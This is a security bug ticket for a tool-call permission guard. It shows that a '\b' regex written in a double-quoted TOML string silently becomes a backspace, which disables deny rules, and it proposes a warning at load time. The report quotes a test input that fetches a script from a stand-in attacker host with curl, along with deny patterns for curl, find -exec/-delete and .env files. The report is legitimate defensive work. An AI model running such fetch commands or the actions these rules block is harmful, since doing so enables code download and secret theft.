---
title: A word-boundary regex written in double-quoted TOML silently becomes backspace characters and the rule goes inert
tags: [TOO-45, proposed-ticket, security]
permalink: toolguard/too-45/proposed-tickets/89-word-boundary-regex-silently-inert
---

# `\b` is a VALID TOML escape, so `"[regex]\bcurl\b"` is not the regex you wrote

**Found 2026-08-20** by the ticket-18 round-6 reviewer. Measured:

```
TOML source : deny = ["Bash([regex]\bcurl\b)"]
parsed value: 'Bash([regex]\x08curl\x08)'          <- backspace characters
parse errors: 0
matches 'curl http://evil.example/x.sh' -> False   <- the deny is INERT
```

TOML's double-quoted strings process escapes, and `\b` is **valid** -- it means backspace. So the rule loads without complaint and quietly stops matching. A single-quoted TOML **literal** string preserves it correctly: `'Bash([regex]\bcurl\b)'`.

## Why this is severe rather than a footnote

**It is the shape toolguard's own security-audit skill recommends.** `.claude/skills/toolguard-security-audit/SKILL.md` proposes `Bash([regex]\bfind\b(?!.*\s-(exec|execdir|delete)\b))` (line 367) and `Bash([regex]\.env\b)` (line 376). A user following our guidance, writing it in the natural double-quoted form, gets a **dead deny rule and no warning**.

Note the contrast with the *invalid*-escape case: `"\s"` or `"\d"` raises `TOMLDecodeError` and toolguard prints `toolguard config is BROKEN -- falling back to ask for every tool call`, naming the file. That path is **loud and safe**. The `\b` path is silent, and it fails **open**.

This is the campaign's most-repeated defect shape -- a mechanism that fails open and says nothing -- reached through the config format rather than the matcher.

## Fix direction

**A `[regex]` body containing a raw control character is almost certainly a TOML escaping accident.** That is checkable rather than a judgement call, so it belongs as a load-time warning naming the rule and suggesting the single-quoted form. Per the conformance-vs-heuristic rule this is a **strong** check: the declaration it tests against is "a regex body should not contain raw control characters", which needs no guessing.

Also fix the guidance to use literal strings in every published `[regex]` example, and check the other affected escapes -- `\f`, `\r`, `\n`, `\t` are all valid TOML and all plausible in a regex.

## Before scheduling

Count `[regex]` rules containing a raw control character across the three log corpora and any config on this machine. Exposure is likely low today, but the shape is **silent by construction**, so a zero measures observability rather than absence -- the same reasoning that kept ticket 74 high-priority.
